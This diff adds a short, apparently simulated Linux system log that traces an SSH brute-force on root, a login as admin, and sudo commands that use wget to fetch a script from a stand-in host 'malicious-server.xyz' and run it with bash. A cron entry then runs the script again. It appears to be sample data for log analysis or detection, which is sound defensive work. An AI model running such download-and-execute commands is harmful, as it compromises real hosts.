@@ -1,0 +1,10 @@
+Oct 14 10:23:45 ubuntu sshd[4010]: Failed password for root from 192.168.1.100 port 49301 ssh2
+Oct 14 10:23:47 ubuntu sshd[4012]: Failed password for root from 192.168.1.100 port 49302 ssh2
+Oct 14 10:23:49 ubuntu sshd[4014]: Failed password for root from 192.168.1.100 port 49303 ssh2
+Oct 14 10:23:51 ubuntu sshd[4016]: Failed password for root from 192.168.1.100 port 49304 ssh2
+Oct 14 10:24:12 ubuntu sshd[4030]: Accepted password for admin from 192.168.1.100 port 49305 ssh2
+Oct 14 10:24:12 ubuntu sshd[4030]: pam_unix(sshd:session): session opened for user admin by (uid=0)
+Oct 14 10:25:01 ubuntu sudo:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://malicious-server.xyz/payload.sh -O /tmp/payload.sh
+Oct 14 10:25:15 ubuntu sudo:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash /tmp/payload.sh
+Oct 14 10:25:30 ubuntu kernel: [ 4321.109] iptables: DROP IN=eth0 OUT= MAC=00:11:22... SRC=192.168.1.100 DST=10.0.0.5 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=49200 DF PROTO=TCP SPT=49310 DPT=4444 WINDOW=5840 RES=0x00 SYN URGP=0
+Oct 14 10:26:00 ubuntu crond[4105]: (root) CMD (/tmp/payload.sh >/dev/null 2>&1)
